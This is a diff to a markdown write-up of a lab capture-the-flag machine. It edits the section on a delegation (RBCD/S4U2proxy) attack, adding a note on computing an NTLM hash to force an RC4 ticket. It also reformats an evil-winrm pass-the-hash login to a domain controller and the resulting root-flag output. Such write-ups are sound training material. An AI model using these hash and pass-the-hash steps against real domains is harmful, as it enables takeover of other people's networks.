@@ -293,7 +293,7 @@ With control over `wsilva`, who has `AddAllowedToAct` rights, the `msDS-AllowedT
 
 To leverage the RBCD primitive with a user account, a series of steps were required to perform an S4U2proxy attack.
 
-*   **Calculate NTLM Hash**: The NTLM hash of `wsilva`'s new password was calculated to force an RC4-based TGT.
+*   **Calculate NTLM Hash**: The NTLM hash of `wsilva`'s new password was calculated to force an RC4-based TGT. (Note: You may not need to do this, in my case, I needed to force a RC4-based TGT, which should yield a 32-character session key, as a plaintext password Summer2025 generates AES256 64-character key, which is not compatible with the next steps.)
     ```zsh
     NTLM=$(echo -n 'Summer2025' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4 | awk '{print $2}')
     ```
@@ -337,11 +337,12 @@ Using the dumped hash, a WinRM shell was established as the Administrator.
 *   **Command**:
     ```zsh
     evil-winrm -i dc.phantom.vl -u administrator -H aa2abd9db4f5984e657f834484512117
-    ```*   **Result**:
-  ```
+    ```
+*   **Result**:
+    ```
     *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
     60d108263adf1769459769c8ddb6efab
-  ```
+    ```
 The root flag was obtained, signifying full domain compromise.
 
 ### Summary of Attack Path
